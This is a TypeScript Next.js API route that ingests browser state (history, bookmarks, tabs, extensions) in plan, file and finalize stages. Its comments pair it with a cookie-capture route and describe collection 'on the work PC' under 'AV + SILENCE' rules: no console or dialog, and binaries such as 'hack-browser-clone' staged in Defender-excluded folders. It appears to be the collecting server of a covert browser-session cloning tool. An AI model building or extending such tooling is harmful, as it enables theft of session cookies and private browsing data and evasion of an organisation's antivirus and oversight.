// TASK_135 §6: clone STATE ingest (device-facing, token-gated)
// Route: POST /api/devices/clone-state?stage=plan|file|finalize
// Auth: device token (SHA-256 hash match), NOT internal bearer — identical to
//       app/api/devices/clone-capture/route.ts, because this is the same device
//       speaking and it must never be given a second way to authenticate.
//
// This is the pipe the browser clone was missing: cookies had a route
// (clone-capture) and the state half had NONE, so history, bookmarks, tabs and
// extensions could be collected on the work PC and never went anywhere.
//
// Three stages, because one request cannot carry a profile safely:
//
//   plan     — the device declares what it HAS (fingerprints only, no bytes).
//              The server answers with the decision: full transfer, or the exact
//              paths a delta needs. This is where `planSync` runs and where every
//              path is re-validated (the device's judgement does not cross the
//              trust boundary with any authority).
//   file     — ONE file's bytes, streamed in and staged into the target's cache.
//              Raw octet-stream with the profile-relative path in a header, so no
//              base64 inflation and no multipart parser to get wrong.
//   finalize — apply the delta's removals, fingerprint what the cache actually
//              holds, and store THAT as the next baseline.
//
// Privacy: no file content, no path list and no error text is ever logged. The
// responses carry counts and named reasons only, exactly like clone-capture.
//
// AV + SILENCE (hard rules): nothing here runs on the work PC. The device side
// (engine/pkg/wake/state.go) reads the profile with no subprocess, no console and
// no dialog, and every directory it runs or stages from is Defender-excluded and
// VERIFIED by `preflight` before a binary lands there
// (engine/cmd/hack-browser-clone/main.go → runPreflight).

import { mkdir } from "node:fs/promises";

import { NextRequest, NextResponse } from "next/server";

import {
  applyStateRemovals,
  decideStateSync,
  fingerprintCache,
  ingestStateFile,
  profileNameOfManifest,
  stateCacheDirForTarget,
  validateManifestFiles,
} from "@/lib/clone-state-ingest";
import { normalizeProfileName } from "@/lib/clone-state-restore";
import { decodeProfilePathHeader } from "@/lib/clone-state-sync-format";
import { CLONE_BROWSERS } from "@/lib/clone-browsers";
import { sha256Hex } from "@/lib/clone-transport";
import { SYNC_REASONS, type StateManifest } from "@/lib/clone-sync-plan";
import { db } from "@/lib/db";

/** A manifest is fingerprints only; 8 MiB is ~50k files, far beyond any profile. */
const PLAN_BODY_CAP = 8 * 1024 * 1024;
/** One file. A History database or an extension bundle is tens of MB, not more. */
const FILE_BODY_CAP = 256 * 1024 * 1024;

/**
 * NO JOB-STATUS GATE ANYWHERE IN THIS FILE, deliberately.
 *
 * The cache this writes into is keyed by device + browser + profile — NOT by job —
 * so a sync arriving after a clone has already launched is not only legal, it is
 * the point of the console's manual re-sync: the replica is brought up to date for
 * the NEXT clone. An earlier version of this route refused a job past "captured",
 * which would have made the manual button dead on every device whose only job has
 * finished, i.e. on every device. The job identifies WHICH clone a transfer belongs
 * to; it does not decide whether the state may be carried.
 */

// What this route will ACCEPT from a device is deliberately wider than what the
// platform will ever ASK a device for (`lib/clone-browsers.ts`'s CHROMIUM_BROWSERS):
// accepting is the safe direction. A device that sends a manifest for a browser this
// build does not know how to request is a device that is newer than the platform,
// and refusing its bytes would lose state that a later platform release will read.
// Requesting, by contrast, must be narrow — a browser whose profile the device
// cannot walk produces an empty manifest that looks exactly like "nothing changed".
const BROWSERS = new Set<string>([...CLONE_BROWSERS, "chromium"]);


interface AuthedDevice {
  id: string;
  userId: string;
}

/** Bearer token → device, fail-closed and with no oracle to distinguish why. */
async function authenticate(request: NextRequest): Promise<AuthedDevice | null> {
  const authHeader = request.headers.get("authorization") || "";
  const tokenMatch = authHeader.match(/^Bearer\s+(.+)$/);
  if (!tokenMatch) return null;
  const device = await db.device.findUnique({
    where: { liveCaptureTokenHash: sha256Hex(tokenMatch[1]) },
    select: { id: true, userId: true },
  });
  return device ? { id: device.id, userId: device.userId } : null;
}

interface LoadedJob {
  ok: boolean;
  cloneJobId: string;
  response: NextResponse;
}

/**
 * The job must be this device's own.
 *
 * Every refusal is the SAME 401 with no detail, so a token holder cannot use this
 * route to enumerate job ids or learn another user's job state — the same rule
 * clone-capture follows.
 *
 * The job identifies WHICH clone a transfer belongs to. It does NOT decide whether
 * the state may be carried — see the "NO JOB-STATUS GATE" note above.
 */
async function loadJob(rawId: unknown, device: AuthedDevice): Promise<LoadedJob> {
  const cloneJobId = typeof rawId === "string" ? rawId : "";
  const deny = { ok: false, cloneJobId, response: NextResponse.json({ error: "Unauthorized" }, { status: 401 }) };
  if (!cloneJobId) return deny;
  const job = await db.cloneJob.findUnique({
    where: { id: cloneJobId },
    select: { id: true, userId: true, sourceDeviceId: true },
  });
  if (!job || job.userId !== device.userId || job.sourceDeviceId !== device.id) return deny;
  return { ok: true, cloneJobId, response: NextResponse.json({ ok: false }) };
}

/** The cache root for a target, refusing an unset base rather than guessing one. */
function cacheDirFor(deviceId: string, browser: string, profileName: string): string {
  // Resolved through the SAME helper the launch uses, so the writer and the
  // reader of the cache can never disagree about where the state lives.
  return stateCacheDirForTarget({ deviceId, browser, profileName });
}

export async function POST(request: NextRequest) {
  try {
    const stage = new URL(request.url).searchParams.get("stage") ?? "";
    if (stage !== "plan" && stage !== "file" && stage !== "finalize") {
      return NextResponse.json({ error: "Bad request: unknown stage" }, { status: 400 });
    }

    const device = await authenticate(request);
    if (!device) {
      return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
    }

    // The binary stage is dispatched first: its body is a stream and its job id
    // travels in a header (a path in a query string would be mangled by any proxy
    // that reorders or decodes it).
    if (stage === "file") {
      return await handleFile(request, device);
    }

    const declared = request.headers.get("content-length");
    if (declared && parseInt(declared, 10) > PLAN_BODY_CAP) {
      return NextResponse.json({ error: "Payload too large" }, { status: 413 });
    }
    let body: Record<string, unknown>;
    try {
      const text = await request.text();
      if (Buffer.byteLength(text, "utf-8") > PLAN_BODY_CAP) {
        return NextResponse.json({ error: "Payload too large" }, { status: 413 });
      }
      body = JSON.parse(text) as Record<string, unknown>;
    } catch {
      return NextResponse.json({ error: "Invalid request" }, { status: 400 });
    }

    const job = await loadJob(body.cloneJobId, device);
    if (!job.ok) return job.response;

    const browser = typeof body.browser === "string" ? body.browser.trim().toLowerCase() : "";
    if (!BROWSERS.has(browser)) {
      return NextResponse.json({ error: "Bad request: invalid browser" }, { status: 400 });
    }
    // The profile name decides WHERE state lands inside the user-data-dir, so it
    // goes through the same validator the materialiser uses — a name that is not a
    // profile name is refused here, never guessed at later.
    const profileName = normalizeProfileName(typeof body.profile === "string" ? body.profile : null);
    if (profileName === null) {
      return NextResponse.json({ error: "Bad request: invalid profile" }, { status: 400 });
    }

    const cacheDir = cacheDirFor(device.id, browser, profileName);
    await mkdir(cacheDir, { recursive: true });

    if (stage === "plan") {
      return await handlePlan(body, device.id, job.cloneJobId, browser, profileName, cacheDir);
    }
    return await handleFinalize(body, job.cloneJobId, browser, profileName, cacheDir);
  } catch {
    // Fixed log line: never echo a parser or filesystem error, which can carry a
    // path from a user's profile.
    console.error("[clone-state] Unexpected error");
    return NextResponse.json({ error: "Internal server error" }, { status: 500 });
  }
}

/**
 * The baseline a delta is computed against.
 *
 * TWO SOURCES, and the order matters. First the last manifest STORED for this
 * device + browser + profile (the job record), because a stored manifest is the
 * server's own record of a transfer it completed. Only when there is none does the
 * target's CACHE become the baseline — and then `fromCache` says so, so the reason
 * reported to the operator is `cache_baseline` rather than a claim about a
 * manifest that does not exist.
 *
 * WHY THE CACHE IS A LEGITIMATE BASELINE. The cache holds exactly the bytes the
 * replica has. Comparing against it can therefore only ever ask for a file the
 * replica LACKS — which is what "continue the transfer that was cut short" means.
 * It cannot lose a file: anything already present is left alone, and anything
 * missing is requested. Its fingerprints carry content hashes
 * (clone-state-ingest's fingerprintCache), so the comparison is content-based
 * rather than size+mtime, and a staged copy's own mtime — a server clock value
 * that can never equal the source's — cannot make every file look changed.
 *
 * A manifest stored by a DIFFERENT browser or profile is not a baseline at all —
 * `planSync` would refuse it, but it is filtered here so the reason names the
 * truth instead of blaming staleness.
 *
 * The query filters on `stateManifestAt` (a nullable timestamp) rather than on the
 * JSON column, because "is this JSON null or SQL null" has two different answers
 * in Prisma and neither is what this check means.
 */
async function loadBaseline(
  deviceId: string,
  browser: string,
  profileName: string,
  excludeJobId: string,
  cacheDir: string,
): Promise<{ manifest: StateManifest | null; fromCache: boolean }> {
  const recent = await db.cloneJob.findMany({
    where: { sourceDeviceId: deviceId, stateManifestAt: { not: null }, id: { not: excludeJobId } },
    orderBy: { stateManifestAt: "desc" },
    take: 8,
    select: { stateManifest: true },
  });
  for (const row of recent) {
    const manifest = row.stateManifest as StateManifest | null;
    if (!manifest || typeof manifest !== "object") continue;
    const sameBrowser = String(manifest.browser ?? "").trim().toLowerCase() === browser;
    const sameProfile = profileNameOfManifest(manifest) === profileName;
    if (sameBrowser && sameProfile) return { manifest, fromCache: false };
  }

  // No stored manifest. What has the cache got? A failure here is treated as an
  // empty cache rather than an error: the next run would then simply be a full
  // transfer, which is correct-but-slower, and refusing the whole sync because a
  // fingerprint could not be taken would be worse.
  const cached = await fingerprintCache(cacheDir).catch(() => []);
  if (cached.length === 0) return { manifest: null, fromCache: false };
  return {
    manifest: { browser, profile: profileName, capturedAt: new Date().toISOString(), files: cached },
    fromCache: true,
  };
}

/**
 * stage=plan — the device says what it HAS; the server says what it NEEDS.
 *
 * The device's fingerprint list is validated, not trusted: unsafe paths, sensitive
 * files and un-fingerprintable entries are refused with a reason. The decision is
 * then computed against the last stored baseline and RECORDED on the job, so the
 * console can say "first clone" or "synced N files" without re-deriving anything.
 */
async function handlePlan(
  body: Record<string, unknown>,
  deviceId: string,
  cloneJobId: string,
  browser: string,
  profileName: string,
  cacheDir: string,
): Promise<NextResponse> {
  const files = body.files;
  if (!Array.isArray(files)) {
    return NextResponse.json({ error: "Bad request: files must be an array" }, { status: 400 });
  }
  const validated = validateManifestFiles(files);
  const capturedAt = typeof body.capturedAt === "string" ? body.capturedAt : new Date().toISOString();
  const next: StateManifest = {
    browser,
    profile: profileName,
    capturedAt,
    files: validated.kept,
    ...(typeof body.version === "string" ? { version: body.version } : {}),
  };

  const baseline = await loadBaseline(deviceId, browser, profileName, cloneJobId, cacheDir);
  const decision = decideStateSync({ previous: baseline.manifest, next });

  // The decision this run actually made. When the baseline came from the CACHE,
  // a delta is not "a reconnect against a manifest we stored" — it is "continue
  // against what the replica already holds" — and it is reported under its own
  // name so nobody has to guess which of the two happened.
  const reason =
    baseline.fromCache && decision.reason === SYNC_REASONS.syncOnReconnect
      ? SYNC_REASONS.cacheBaseline
      : decision.reason;

  // The cache may already hold files from an earlier clone — that is the point of
  // it. Reporting its size lets the device and the console see whether this is a
  // genuine first clone or a reconnect onto an existing replica.
  const cacheFiles = (await fingerprintCache(cacheDir).catch(() => [])).length;

  await db.cloneJob.update({
    where: { id: cloneJobId },
    data: {
      stateSyncMode: decision.mode,
      stateSyncReason: reason,
      profileName,
    },
  });

  return NextResponse.json({
    ok: true,
    mode: decision.mode,
    reason,
    // Empty for a full transfer: the device sends everything it can read.
    requestedPaths: decision.requestedPaths,
    // Echoed back by the device at finalize, so the destructive half of a delta
    // runs only AFTER the replacement bytes have landed. A device that dies
    // mid-transfer then leaves a stale file, which is visible; deleting first
    // would leave a MISSING file, which is not.
    removedPaths: decision.delta?.removed ?? [],
    excluded: decision.excluded.slice(0, 200),
    excludedCount: decision.excluded.length,
    declaredBytes: validated.bytes,
    cachedFiles: cacheFiles,
  });
}

/**
 * stage=file — one file's bytes.
 *
 * The path arrives in a header, URL-encoded, because a profile-relative path can
 * hold spaces and backslashes and a query string is not a safe place for either.
 * The browser and profile travel in headers for the same reason they cannot be
 * read from a body that is already the file.
 */
async function handleFile(request: NextRequest, device: AuthedDevice): Promise<NextResponse> {
  const cloneJobId = request.headers.get("x-sw-clone-job") ?? "";
  const rawPath = request.headers.get("x-sw-profile-path") ?? "";
  // Decoded through the shared helper, NOT decodeURIComponent directly: the device
  // encodes with Go's url.QueryEscape, so a space arrives as `+` and a bare
  // decodeURIComponent turns `Top Sites` into `Top+Sites`. See the helper's comment
  // for why that was silent and what it cost.
  const relPath = decodeProfilePathHeader(rawPath);
  if (relPath === null) {
    return NextResponse.json({ error: "Bad request: path not decodable" }, { status: 400 });
  }
  if (!relPath) {
    return NextResponse.json({ error: "Bad request: missing path" }, { status: 400 });
  }

  const job = await loadJob(cloneJobId, device);
  if (!job.ok) return job.response;

  const declared = request.headers.get("content-length");
  if (declared && parseInt(declared, 10) > FILE_BODY_CAP) {
    return NextResponse.json({ error: "Payload too large" }, { status: 413 });
  }
  let content: Buffer;
  try {
    content = Buffer.from(await request.arrayBuffer());
  } catch {
    return NextResponse.json({ error: "Invalid request" }, { status: 400 });
  }
  if (content.length > FILE_BODY_CAP) {
    return NextResponse.json({ error: "Payload too large" }, { status: 413 });
  }

  const browser = (request.headers.get("x-sw-browser") ?? "").trim().toLowerCase();
  const profileName = normalizeProfileName(request.headers.get("x-sw-profile"));
  if (!BROWSERS.has(browser) || profileName === null) {
    return NextResponse.json({ error: "Bad request: browser/profile required" }, { status: 400 });
  }
  const cacheDir = cacheDirFor(device.id, browser, profileName);
  await mkdir(cacheDir, { recursive: true });

  const res = await ingestStateFile({ cacheDir, relPath, content });
  if (!res.ok) {
    // A NAME from the shared rule set. Nothing here echoes file content.
    return NextResponse.json({ ok: false, reason: res.error ?? "state_write_failed" }, { status: 422 });
  }
  return NextResponse.json({ ok: true, bytes: res.bytes }, { status: 202 });
}

/**
 * stage=finalize — close the transfer: apply the delta's removals, then record
 * what the cache ACTUALLY holds as the next baseline.
 *
 * The device does not get to state the mode or the reason: those were computed and
 * written by the plan stage, so a device cannot describe a full transfer as a
 * delta (which would make the next clone skip everything it never sent).
 */
async function handleFinalize(
  body: Record<string, unknown>,
  cloneJobId: string,
  browser: string,
  profileName: string,
  cacheDir: string,
): Promise<NextResponse> {
  const removedInput = Array.isArray(body.removed) ? (body.removed as string[]) : [];
  const removal = await applyStateRemovals({ cacheDir, paths: removedInput });
  const files = await fingerprintCache(cacheDir);
  const bytes = files.reduce((sum, f) => sum + f.size, 0);
  const capturedAt = typeof body.capturedAt === "string" ? body.capturedAt : new Date().toISOString();

  const manifest: StateManifest = {
    browser,
    profile: profileName,
    capturedAt,
    files,
    ...(typeof body.version === "string" ? { version: body.version } : {}),
  };

  await db.cloneJob.update({
    where: { id: cloneJobId },
    data: {
      stateManifest: manifest as unknown as object,
      stateManifestAt: new Date(),
      profileName,
    },
  });

  return NextResponse.json({
    ok: true,
    cachedFiles: files.length,
    cachedBytes: bytes,
    removed: removal.removed.length,
    refusedRemovals: removal.refused.slice(0, 50),
  });
}



